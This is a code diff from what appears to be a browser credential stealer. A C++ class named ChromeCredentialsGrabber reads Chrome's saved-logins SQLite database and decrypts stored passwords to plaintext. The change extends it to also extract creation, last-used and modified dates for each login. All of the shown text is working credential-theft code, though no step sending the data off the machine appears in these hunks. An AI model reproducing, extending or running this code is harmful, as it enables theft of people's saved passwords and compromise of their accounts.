@@ -60,14 +60,16 @@ std::optional<Credentials> ChromeCredentialsGrabber::grab_credentials() const
 		);
 
 		for (SqliteRowIterator iterator = login_data_db.iterate_query(
-			     "SELECT origin_url, username_value, password_value FROM logins"
+			     "SELECT origin_url, username_value, password_value, date_created, date_last_used, date_password_modified FROM logins"
 		     );
 		     iterator.next();)
 		{
 			const SqliteRow row = iterator.current();
-			const auto [origin_url, username_value, password_value] = as_tuple<std::wstring, std::wstring, Buffer>(
-				row
-			);
+			const auto [origin_url, username_value, password_value, date_created, date_accessed, date_modified] =
+				as_tuple<
+					std::wstring, std::wstring, Buffer, int64_t, int64_t, int64_t>(
+					row
+				);
 
 			if (password_value.empty())
 			{
@@ -81,12 +83,25 @@ std::optional<Credentials> ChromeCredentialsGrabber::grab_credentials() const
 			credentials.emplace_back(
 				origin_url,
 				username_value,
-				Strings::to_wstring(Strings::to_string(plaintext_password))
+				Strings::to_wstring(Strings::to_string(plaintext_password)),
+				convert_datetime(date_created),
+				convert_datetime(date_accessed),
+				convert_datetime(date_modified)
 			);
 		}
 	}
 
 	return credentials;
+}
+
+std::optional<Time::Datetime> ChromeCredentialsGrabber::convert_datetime(const int64_t webkit_datetime)
+{
+	if (webkit_datetime == 0)
+	{
+		return {};
+	}
+
+	return Time::from_webkit_time(webkit_datetime);
 }
 
 std::filesystem::path ChromeCredentialsGrabber::get_local_chrome_path()
